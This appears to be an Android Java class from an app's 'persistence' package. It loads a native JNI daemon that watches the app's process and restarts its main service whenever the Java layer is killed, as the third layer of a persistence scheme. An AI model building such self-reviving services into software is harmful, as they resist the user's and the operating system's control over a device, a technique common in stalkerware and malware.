package com.fason.app.persistence.daemon;

import android.content.Context;
import android.util.Log;
import com.fason.app.core.FasonApp;

/**
 * Layer 3: Native Daemon
 * Loads a JNI companion that monitors the parent process and restarts
 * the service if the Java layer dies. Runs outside the JVM heap.
 */
public final class NativeDaemon {
    private static final String TAG = "NativeDaemon";
    private static volatile boolean loaded = false;
    private static volatile boolean running = false;

    static {
        try {
            System.loadLibrary("fason_daemon");
            loaded = true;
        } catch (UnsatisfiedLinkError e) {
            Log.w(TAG, "Native library not available: " + e.getMessage());
            loaded = false;
        } catch (Exception e) {
            Log.w(TAG, "Native load failed", e);
            loaded = false;
        }
    }

    private NativeDaemon() {}

    public static boolean isAvailable() {
        return loaded;
    }

    public static void start() {
        if (!loaded || running) return;
        try {
            Context ctx = FasonApp.getContext();
            String packageName = ctx.getPackageName();
            String serviceClass = packageName + "/.service.MainService";

            int pid = android.os.Process.myPid();
            int result = nativeStartDaemon(pid, serviceClass);
            if (result == 0) {
                running = true;
                Log.i(TAG, "Native daemon started, monitoring PID " + pid);
            } else {
                Log.w(TAG, "Native daemon start failed, code: " + result);
            }
        } catch (Exception e) {
            Log.e(TAG, "Daemon start error", e);
        }
    }

    public static void stop() {
        if (!loaded || !running) return;
        try {
            nativeStopDaemon();
            running = false;
        } catch (Exception e) {
            Log.e(TAG, "Daemon stop error", e);
        }
    }

    public static boolean isRunning() {
        return running;
    }

    // JNI methods implemented in fason_daemon.cpp
    private static native int nativeStartDaemon(int parentPid, String serviceComponent);
    private static native int nativeStopDaemon();
    private static native int nativePing();
}
